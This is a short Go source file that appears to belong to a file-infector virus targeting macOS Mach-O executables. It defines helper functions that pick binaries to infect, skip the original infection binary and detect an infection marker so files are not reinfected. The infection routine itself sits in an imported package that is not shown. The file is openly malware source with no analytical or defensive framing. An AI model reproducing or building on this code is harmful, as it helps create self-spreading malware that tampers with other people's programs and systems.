package main

import (
	"bytes"
	"debug/macho"
	"io/ioutil"
	"os"
	"path/filepath"

	"./infect"
)

// canInfect will check if a binary can be infected and fails siletly on
// failures
func canInfect(path string) bool {
	return !isInfected(path) && notInfect(path)
}

// notInfect makes sure that the binary being run is not the initial infection
// binary
func notInfect(path string) bool {
	absCurrPath, _ := filepath.Abs(os.Args[0])
	if path == absCurrPath {
		return false
	}

	return true
}

func isMacho(path string) bool {
	_, err := macho.Open(path)
	if err != nil {
		return false
	}
	return true
}

func isInfected(path string) bool {
	file, err := ioutil.ReadFile(path)
	if err != nil {
		return true
	}

	if bytes.Contains(file, []byte(infect.InfectMark)) {
		return true
	}
	return false
}
